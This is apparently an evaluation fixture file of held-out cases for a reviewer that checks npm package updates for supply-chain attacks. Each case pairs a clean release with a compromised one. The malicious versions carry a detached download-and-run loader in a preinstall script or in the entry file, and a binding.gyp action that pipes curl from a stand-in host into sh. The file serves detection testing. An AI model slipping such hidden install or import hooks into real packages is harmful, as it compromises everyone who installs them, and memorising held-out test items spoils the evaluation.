// Attacks disclosed after the reviewer's training cutoff (models.json). Each is a synthetic reduction of a public
// write-up: the trigger shape is kept, every body is written for this eval and hosts use the reserved .example domain.
// Never use these to tune prompts.
import type { FileMap } from "../../src/prepass.ts";
import type { Case, Pkg } from "../2026-10-28-function-color-postinstall-hidden-download/cases.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const pkg = (o: Record<string, unknown>) => JSON.stringify(o, null, 2) + "\n";
const lib = (name: string, version: string, manifest: Record<string, unknown>, rest: Record<string, string>): Pkg =>
  ({ name, version, files: files({ "package.json": pkg({ name, version, main: "index.js", ...manifest }), ...rest }) });

export interface HeldOutCase extends Case { disclosed: string; source: string }

const STAGE = `const https = require("https");\nconst { spawn } = require("child_process");\nconst fs = require("fs");\nconst os = require("os");\nconst dest = os.tmpdir() + "/.cache-helper.js";\nhttps.get("https://stage.example/s.js", (r) => { r.pipe(fs.createWriteStream(dest)).on("close", () => spawn(process.execPath, [dest], { detached: true, stdio: "ignore" }).unref()); });\n`;

export const HELDOUT: HeldOutCase[] = [
  {
    id: "keyv-style-preinstall-worm", kind: "attack", expect: "hold", disclosed: "2026-08-05",
    source: "https://www.aikido.dev/blog/keyv-and-friends-compromised-in-npm-supply-chain-attack",
    note: "patch release adds a preinstall script running a new setup.mjs that downloads and starts a second stage",
    base: [lib("kv-store", "5.3.1", {}, { "index.js": `module.exports = new Map();\n` })],
    head: [lib("kv-store", "5.3.2", { scripts: { preinstall: "node setup.mjs" } }, { "index.js": `module.exports = new Map();\n`, "setup.mjs": STAGE })],
  },
  {
    id: "node-gyp-style-binding-gyp", kind: "attack", expect: "hold", disclosed: "2026-06-03",
    source: "https://snyk.io/blog/node-gyp-supply-chain-compromise-self-propagating-npm-worm-binding-gyp/",
    note: "no scripts entry: a new binding.gyp action runs a shell command at install time through node-gyp",
    base: [lib("sum-native", "1.4.0", {}, { "index.js": `module.exports = (a, b) => a + b;\n` })],
    head: [lib("sum-native", "1.4.1", {}, { "index.js": `module.exports = (a, b) => a + b;\n`, "binding.gyp": `{ "targets": [{ "target_name": "x", "actions": [{ "action_name": "prep", "inputs": [], "outputs": ["x.out"], "action": ["sh", "-c", "curl -s https://stage.example/s.sh | sh"] }] }] }\n` })],
  },
  {
    id: "jscrambler-style-import-loader", kind: "attack", expect: "hold", disclosed: "2026-07-11",
    source: "https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/",
    note: "no install scripts: the entry file runs a downloaded stage when the package is imported",
    base: [lib("code-guard", "8.17.0", {}, { "index.js": `module.exports = { protect: (s) => s };\n` })],
    head: [lib("code-guard", "8.18.0", {}, { "index.js": `module.exports = { protect: (s) => s };\n${STAGE}` })],
  },
];
